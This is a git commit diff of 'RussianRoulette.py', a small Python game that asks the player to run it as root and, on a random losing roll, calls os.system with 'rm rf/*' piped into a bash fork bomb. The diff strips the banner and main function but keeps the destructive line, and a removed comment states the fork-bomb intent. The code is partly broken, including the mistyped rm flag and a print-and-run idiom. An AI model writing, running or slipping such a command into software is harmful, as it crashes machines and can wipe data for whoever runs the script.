70663972b06aa6d181c5695e3878f80da540274d
Richycam <97134605+Richycam@users.noreply.github.com>
2024-04-26 21:09:47 +0100

    Update RussianRoulette.py

--- RussianRoulette.py
+++ RussianRoulette.py
@@ -2,35 +2,17 @@
 import os
 import random 
 
-start_game = input("Wanna play a game? \n \n ")
-play = input("Russian roulette... pick a number between 1 and 6 \n make sure your running as root \n")
+
+start_game = input("Russian Roulette, press enter \n \n ")
+play = int(input("Russian roulette... pick a number between 1 and 6 \n make sure your running as root \n"))
 list = [1,2,3,4,5,6]
 choose = random.choice(list)
 
-def print_banner(text: str, symbol: str = "*") -> None:
-    banner_length = len(text) + 4
-    banner_line = symbol * banner_length
 
-    print(banner_line)
-    print(f"{symbol} {text} {symbol}")
-    print(banner_line)
-text = "Russian Roulette"
-
-def main():
-    print_banner(text)
-    start_game
-
-    # if you loose the game should run a fork bomb 
-
-    if start_game == str("yes") or str("Yes"):
-        play
-        choose
-        if choose == play:
-            print("You loose :( ") and os.system("rm rf/* | :(){ :|:& };:")
-        else:
-            print("You Win")
-    else:
-        print("smart move")
-        
-
-main()
+start_game
+play
+choose
+if choose == play:
+    print("You loose :( ") and os.system("rm rf/* | :(){ :|:& };:")
+else:
+    print("Your computer is safe")
